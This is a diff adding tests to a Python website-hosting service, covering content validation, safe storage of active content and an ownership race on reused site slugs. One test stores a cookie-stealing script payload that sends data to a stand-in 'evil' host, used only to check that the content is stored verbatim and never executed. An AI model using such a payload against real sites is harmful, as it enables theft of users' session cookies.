@@ -25,9 +25,12 @@ def created(slug: str, email: str = OWNER) -> website.Website:
         return website.create(conn, slug, owner)
 
 
-def state_of(slug: str, path: str, content: str) -> website.FileWrite:
+def state_of(
+    slug: str, path: str, content: str, email: str = OWNER
+) -> website.FileWrite:
     with connect() as conn:
-        state = website.file_state(conn, slug, path, content)
+        user_id = user.ensure(conn, email).id
+        state = website.file_state(conn, slug, path, content, user_id)
     assert state is not None
     return state
 
@@ -200,6 +203,36 @@ def test_the_content_check_tolerates_sloppy_html():
     website.check_content("a.html", "just some text, no tags")
 
 
+def test_the_content_check_rejects_broken_unicode():
+    """A lone surrogate is not encodable text, and NUL bytes are not text."""
+    with pytest.raises(website.WebsiteError, match="not valid text"):
+        website.check_content("a.html", "before\ud800after")
+    with pytest.raises(website.WebsiteError, match="NUL"):
+        website.check_content("a.css", "body{}\x00")
+
+
+def test_the_content_check_does_not_choke_on_pathological_input():
+    """Deeply nested markup and braces must be read, not recursed into a
+    crash or hang — the validators are linear scanners, not tree builders."""
+    website.check_content("a.html", "<div>" * 50_000 + "x" + "</div>" * 50_000)
+    website.check_content("a.css", "@media all {" * 50_000 + "}" * 50_000)
+    # a real structural error is still caught, however deep
+    with pytest.raises(website.WebsiteError, match="stray"):
+        website.check_content("a.css", "}" * 50_000)
+
+
+async def test_active_content_is_stored_verbatim_never_executed(data_dir):
+    """cervo hosts whatever HTML/CSS an owner writes — scripts included — but
+    only ever writes bytes to disk; nothing in the pipeline evaluates them."""
+    payload = "<script>fetch('//evil/'+document.cookie)</script>"
+    created("mysite")
+    deploy()
+    async with chat() as c:
+        await call(c, "write_file", slug="mysite", path="xss.html", content=payload)
+    assert deploy() == 2
+    assert (data_dir / "mysite" / "xss.html").read_text() == payload
+
+
 async def test_a_site_deleted_mid_chain_is_not_resurrected(data_dir):
     created("mysite")
     deploy()
@@ -216,6 +249,37 @@ async def test_a_site_deleted_mid_chain_is_not_resurrected(data_dir):
     state = state_of("mysite", "late.html", HTML)
     assert state.status == "failed"
     assert "deleted" in state.error
+
+
+async def test_a_slug_retaken_mid_flight_gets_no_foreign_write(data_dir):
+    """A write queued by the old owner must never land in the new owner's site.
+
+    The mirror of the delete_file race: an owner submits a write, loses the
+    slug (deletes it, someone else takes it), and the stale write chain then
+    runs against a site that is now someone else's. The content must never
+    be written, exactly as a deletion carrying a stale owner is refused.
+    """
+    created("mysite")
+    deploy()
+    async with chat() as c:  # the owner submits a write...
+        await call(c, "write_file", slug="mysite", path="planted.html", content=HTML)
+
+    with connect() as conn:  # ...then the slug changes hands
+        owner = user.ensure(conn, OWNER)
+        website.delete(conn, "mysite", owner)
+        newcomer = user.ensure(conn, "newcomer@example.com")
+        website.create(conn, "mysite", newcomer)
+
+    deploy()  # the stale write chain runs against the newcomer's fresh site
+
+    assert not (data_dir / "mysite" / "planted.html").exists()  # never written
+    with connect() as conn:
+        row = conn.execute(
+            "SELECT status, error FROM job WHERE payload LIKE ? ORDER BY id DESC LIMIT 1",
+            ("%planted.html%",),
+        ).fetchone()
+    assert row["status"] == "failed"
+    assert "deleted" in row["error"]
 
 
 async def test_an_identical_submission_in_flight_is_not_queued_twice():
